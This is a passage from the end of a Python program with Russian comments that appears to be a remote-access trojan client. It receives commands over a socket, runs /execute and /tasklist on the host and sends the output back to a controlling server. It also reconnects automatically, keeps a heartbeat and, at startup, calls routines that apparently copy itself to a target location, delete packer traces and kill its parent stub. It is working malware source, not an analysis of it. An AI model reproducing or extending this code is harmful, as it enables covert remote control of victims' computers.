                            # Здесь происходит вызов func(args), который возвращает кортеж (message, False, None)
                            result_tuple = func(args)
                            result, is_file_result, file_path = result_tuple  
                            
                        else:
                            # ВСЕ остальные команды (включая /execute и /tasklist)
                            # result получает строку (для коротких) или путь (для длинных)
                            result = func(args)
                    
                        is_file_result = False
                        file_path = None
                        
                        # Проверяем, вернула ли одна из "файловых" команд путь к существующему файлу
                        if cmd_name in ["/execute", "/tasklist"] and isinstance(result, str) and os.path.exists(result):
                            is_file_result = True
                            file_path = result
                            # Это фидбэк для Сервера/пользователя, пока идет отправка
                            result = f"✅ Вывод команды {cmd_name} готов к отправке как TXT файл." 
                            
                        if result:
                            # Теперь result - это строка (или был строкой), 
                            # send_response получает строку. ОШИБКИ НЕТ.
                            send_response(conn, result, cmd_name=cmd_name, is_file=is_file_result, file_path=file_path)

                            # Теперь result.startswith() вызывается на строке. ОШИБКИ НЕТ.
                            if result.startswith("✅ Клиент перезапускается."): 
                                logger.warning("Команда перезапуска получена. Завершение текущего процесса.")
                                os._exit(0)
                                
                        if cmd_name == "/playsound":
                            global music_thread
                            try:
                                user_path = args
                                if not user_path:
                                    send_response(conn, "❌ Не указан путь к файлу. Использование: /playsound <путь_к_файлу>")
                                else:
                                    full_path = os.path.join(current_path, user_path)
                                    if not os.path.isfile(full_path):
                                        send_response(conn, f"❌ Файл не найден: {full_path}")
                                    elif not initialize_mixer():
                                        send_response(conn, "❌ Не удалось инициализировать звуковой микшер.")
                                    elif music_thread and music_thread.is_alive():
                                        send_response(conn, "❌ Музыка уже играет. Используйте /stopsound перед запуском новой.")
                                    else:
                                        music_stop_event.clear()
                                        music_thread = threading.Thread(target=play_sound_task, args=(conn, full_path), daemon=True)
                                        music_thread.start()
                            except Exception as e:
                                send_response(conn, f'❌ Error: {e}')
                        elif cmd_name == "/stopsound":
                            try:
                                if not _mixer_initialized or not pygame.mixer.music.get_busy():
                                    send_response(conn, 'ℹ️ No music is currently playing.')
                                else:
                                    pygame.mixer.music.stop()
                                    music_stop_event.set()
                                    send_response(conn, '✅ Music stopped successfully')
                            except Exception as e:
                                send_response(conn, f'❌ Error: {e}')
                                
                    except json.JSONDecodeError:
                        # Если не удалось декодировать JSON, это может быть неполная строка,
                        # или начало бинарного файла. Мы не можем точно знать, поэтому 
                        # возвращаем строку в буфер и ждем дальше.
                        buffer = line + b'\n' + buffer 
                        break # Выходим, чтобы ждать больше данных
                        
                    except Exception as e:
                        send_response(conn, f"❌ Ошибка обработки команды: {str(e)}")
                        
        except Exception as e:
            logger.error(f"Ошибка соединения: {e}")
        finally:
            # Сбрасываем глобальный сокет при отключении
            with socket_lock:
                current_socket = None
                
            if conn:
                conn.close()
                
            # Остановка потока auto
            stop_event.set()
            if auto_thread and auto_thread.is_alive():
                auto_thread.join(1)
                
            # 🔥 Остановка Heartbeat
            hb_stop_event.set()
            if 'hb_thread' in locals() and hb_thread.is_alive():
                hb_thread.join(1)
            
            logger.warning("Переподключение...")
            time.sleep(RECONNECT_DELAY)

if __name__ == "__main__":
    copy_to_target()
    delete_mei()
    kill_parent_stub()
    main_client_loop()
